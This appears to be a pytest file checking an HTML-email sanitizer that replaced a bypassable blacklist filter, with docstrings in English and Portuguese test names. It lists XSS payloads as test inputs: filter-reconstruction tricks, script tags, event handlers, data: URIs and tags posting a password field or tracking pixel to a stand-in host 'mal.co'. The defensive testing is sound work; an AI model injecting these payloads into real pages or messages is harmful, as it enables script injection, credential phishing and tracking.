"""Sanitization of the HTML body in POST /internal/send-email.

The previous filter was four blacklist `re.sub` calls in a SINGLE PASS. Removing
an occurrence of a pattern from inside a text REBUILDS that pattern from the
edges — `javjavascript:ascript:` came out as an intact `javascript:`.
Besides that, the list did not cover `<svg>`, `<math>`, `srcdoc` or `style`.

What that meant in practice: any user can create and enroll a dedicated executor
within their quota, and this endpoint sends through the platform's Resend
account, with a verified domain. Arbitrary HTML there is phishing with valid SPF
and DKIM.

These tests cover the behavior (the HTML that comes out), not the
implementation: if nh3 is ever swapped for another allowlist, they still hold.
"""
import pytest

from app.api.routers.internal_email_router import SendEmailRequest


def _limpa(html: str) -> str:
    return SendEmailRequest(to=["a@b.com"], subject="s", html=html).html


# Benign anchor: nh3 removes the forbidden tag ENTIRELY, and a body left empty
# is rejected by `validate_html_not_empty` — which would test the wrong
# validator. With the anchor, the body stays valid and we can assert on what
# came out (and what remained).
_ANCORA = "<p>relatório pronto</p>"


def _limpa_com_ancora(html: str) -> str:
    saida = _limpa(_ANCORA + html)
    assert "relatório pronto" in saida, "a âncora benigna não sobreviveu"
    return saida


# ── Bypasses por reconstrucao (a falha original) ─────────────────────────────

@pytest.mark.parametrize(
    "payload",
    [
        '<a href="javjavascript:ascript:alert(1)">x</a>',   # reconstroi "javascript:"
        '<a href="javascript:alert(1)">x</a>',              # direto
        '<a href="JaVaScRiPt:alert(1)">x</a>',              # caixa alternada
        '<a href="java\tscript:alert(1)">x</a>',            # tab in the middle of the scheme
    ],
)
def test_protocolo_javascript_nunca_sobrevive(payload):
    saida = _limpa_com_ancora(payload).lower().replace("\t", "").replace("\n", "")
    assert "javascript:" not in saida


@pytest.mark.parametrize(
    "payload",
    [
        "<scr<script>ipt>alert(1)</script>",   # reconstroi "<script>"
        "<script>alert(1)</script>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<script>alert(1)",                    # not closed
    ],
)
def test_script_nunca_sobrevive(payload):
    assert "<script" not in _limpa_com_ancora(payload).lower()


@pytest.mark.parametrize(
    "payload",
    [
        "<img src=x onerror=alert(1)>",
        "<img src=x ononerrorerror=alert(1)>",   # reconstroi "onerror="
        "<img src=x onerror\n=alert(1)>",        # line break before the '='
        "<body onload=alert(1)>",
    ],
)
def test_manipulador_de_evento_nunca_sobrevive(payload):
    saida = _limpa_com_ancora(payload).lower()
    assert "onerror" not in saida
    assert "onload" not in saida


# ── Tags the old blacklist did not even list ─────────────────────────────────

@pytest.mark.parametrize(
    "payload,proibido",
    [
        ("<svg onload=alert(1)></svg>", "svg"),
        ("<math><mtext></mtext></math>", "math"),
        ('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>', "srcdoc"),
        ('<object data="x.swf"></object>', "object"),
        ('<form action="http://mal.co"><input name=senha></form>', "form"),
        ('<base href="http://mal.co/">', "base"),
        ('<p style="background:url(http://mal.co/rastreio)">x</p>', "style"),
    ],
)
def test_tag_ou_atributo_fora_da_allowlist_e_removido(payload, proibido):
    assert proibido not in _limpa_com_ancora(payload).lower()


@pytest.mark.parametrize(
    "payload",
    [
        '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">',
        '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    ],
)
def test_data_uri_e_removido(payload):
    """`data:` in <img>/<a> smuggles SVG with script into clients that render it."""
    assert "data:" not in _limpa_com_ancora(payload).lower()


# ── The other side: legitimate e-mail has to keep working ────────────────────

def test_html_legitimo_e_preservado():
    entrada = (
        "<p>Olá <strong>Maria</strong>,</p>"
        '<p>O relatório <em>Uso do solo</em> ficou pronto. '
        '<a href="https://atlans.example.org/runs/abc">Ver execução</a>.</p>'
        "<ul><li>128 feições</li><li>3,4 s</li></ul>"
    )
    saida = _limpa(entrada)

    for trecho in ["<strong>Maria</strong>", "<em>Uso do solo</em>",
                   "https://atlans.example.org/runs/abc", "<li>128 feições</li>"]:
        assert trecho in saida


def test_tabela_e_imagem_https_sao_preservadas():
    entrada = (
        '<table border="1"><tr><th colspan="2">Resumo</th></tr>'
        '<tr><td>ok</td><td>2</td></tr></table>'
        '<img src="https://atlans.example.org/logo.png" alt="Atlans" width="120">'
    )
    saida = _limpa(entrada)

    assert "<table" in saida and "<th" in saida and "colspan" in saida
    assert "https://atlans.example.org/logo.png" in saida


def test_link_externo_recebe_rel_seguro():
    """`link_rel` closes tabnabbing without depending on the workflow author."""
    saida = _limpa('<a href="https://exemplo.com">x</a>')

    assert "noopener" in saida and "noreferrer" in saida


@pytest.mark.parametrize("esquema", ["https://atlans.example.org/x", "http://exemplo.com", "mailto:s@atlans.example.org"])
def test_protocolos_permitidos_passam(esquema):
    assert esquema in _limpa(f'<a href="{esquema}">x</a>')


# ── Interaction with the empty-body validator ────────────────────────────────

def test_corpo_que_fica_vazio_apos_sanitizacao_e_recusado():
    """Validator order: sanitize_html runs before validate_html_not_empty.

    Without that, a body with only forbidden tags went empty to Resend, came
    back with "Missing html or text field" and the generic except turned it into
    a 502 with no clue.
    """
    from pydantic import ValidationError

    with pytest.raises(ValidationError):
        _limpa("<script>alert(1)</script>")
